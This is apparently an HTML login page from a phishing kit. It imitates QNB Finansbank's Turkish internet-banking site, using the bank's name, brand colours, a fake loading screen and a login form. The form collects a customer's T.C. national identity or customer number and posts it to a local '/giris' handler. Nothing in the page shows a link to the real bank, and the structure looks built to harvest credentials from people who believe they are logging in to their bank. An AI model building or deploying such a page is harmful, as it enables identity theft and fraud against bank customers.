<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css"
        integrity="sha384-4LISF5TTJX/fLmGSxO53rV4miRxdg84mZsxmO8Rx5jGtp/LbrixFETvWa5a6sESd" crossorigin="anonymous">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="assets/css/style1.css">
    <title>QNB Finansbank İnternet Şubesi</title>
    <link rel="icon" href="ayar/resim/logo.png" type="image/png">
    <style>
        .error-message {
            color: #a71a2f; /* QNB Finansbank red shade */
            font-size: 13px;
            font-family: 'Inter', sans-serif;
            font-weight: 400;
            display: none;
            margin-top: 8px;
            line-height: 1.4;
            background-color: #fff5f5; /* Light red background for corporate look */
            padding: 8px 12px;
            border: 1px solid #a71a2f;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
        }
        .error-input {
            border: 2px solid #a71a2f !important; /* QNB red border */
            background-color: #fff5f5; /* Light red background */
            transition: border-color 0.3s ease, background-color 0.3s ease;
        }
        .field {
            border: 1px solid #ccc;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Inter', sans-serif;
            font-size: 16px; /* Prevent zoom on mobile */
            width: 100%;
            box-sizing: border-box;
            touch-action: manipulation; /* Prevent zoom on touch */
        }
        .field:focus {
            border-color: #83074c; /* QNB purple shade */
            outline: none;
        }
        .button {
            background-color: #83074c; /* QNB purple shade */
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .button:disabled {
            background-color: #ccc; /* Grayed out when disabled */
            cursor: not-allowed;
        }
        .form-check-input:checked {
            background-color: #83074c;
            border-color: #83074c;
        }
        .form-check-input {
            width: 2em;
            height: 2em;
        }
    </style>
</head>
<body>
    <div id="firstContent">
        <img src="assets/img/loading.png" id="loadingImage" alt="Loading">
    </div>
    <div id="thirdContent">
        <form action="/giris" method="post">
            <div id="form1">
                <a href="/" style="text-decoration: none;">
                    <div style="margin-top: 17px; float: right; margin-right: 15px; text-align: right;">
                        <i class="bi bi-x" style="color: #fff; font-size: 45px;"></i>
                    </div>
                </a>
                <div class="tabs">
                    <div class="active">Bireysel</div>
                    <div class="line"></div>
                    <div>Kurumsal</div>
                </div>
                <div class="inputs">
                    <div class="group">
                        <div>
                            <input type="text" placeholder="T.C. Kimlik veya Müşteri Numaranız" inputmode="numeric"
                                class="field" name="tc" id="tc" maxlength="11" required
                                autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                            <p id="error-message" class="error-message" role="alert">T.C. Kimlik numarası hatalı girdiniz</p>
                        </div>
                    </div>
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input shadow-none" checked id="exampleCheck1">
                        <label class="form-check-label" for="exampleCheck1"
                            style="margin-top: 6px; margin-left: 6px; color: #fff;">Beni hatırla</label>
                    </div>
                </div>
                <div class="giris-yap">
                    <input type="submit" id="nextPage" class="button" value="Giriş Yap" disabled>
                </div>
            </div>
        </form>
    </div>
    <script>
        window.addEventListener('load', function () {
            const firstContent = document.getElementById('firstContent');
            setTimeout(function () {
                firstContent.classList.add('fade-out');
                setTimeout(function () {
                    firstContent.style.display = 'none';
                }, 1000);
            }, 2000);
        });

        $(document).ready(function () {
            // TC alanına sadece rakam girişi
            $('#tc').on('keypress', function (e) {
                if (e.which < 48 || e.which > 57) {
                    e.preventDefault();
                }
            });

            // Real-time validation for TC
            $('#tc').on('input', validateTc);

            // Form submission validation
            $('#form1').on('submit', function (e) {
                const tcValue = $('#tc').val().trim();
                if (!validateTc()) {
                    e.preventDefault();
                }
            });

            function validateTc() {
                const value = $('#tc').val().trim();
                const isValid = /^[0-9]{11}$/.test(value);
                const nextButton = $('#nextPage');
                const errorMessage = $('#error-message');

                if (isValid) {
                    $('#tc').removeClass('error-input');
                    errorMessage.hide();
                    nextButton.prop('disabled', false); // Enable button
                    return true;
                } else {
                    $('#tc').removeClass('error-input');
                    errorMessage.hide();
                    nextButton.prop('disabled', true); // Disable button
                    return false;
                }
            }
        });

        window.onload = function () {
            const urlParams = new URLSearchParams(window.location.search);
            const errorMessage = urlParams.get('error');
            const tcInput = document.getElementById('tc');
            const errorElement = document.getElementById('error-message');
            const nextButton = document.getElementById('nextPage');

            if (errorMessage) {
                tcInput.classList.add('error-input');
                errorElement.style.display = 'block';
                nextButton.disabled = true; // Disable button on error
            } else {
                tcInput.classList.remove('error-input');
                errorElement.style.display = 'none';
                nextButton.disabled = true; // Disable button initially
            }
        };
    </script>
</body>
</html>
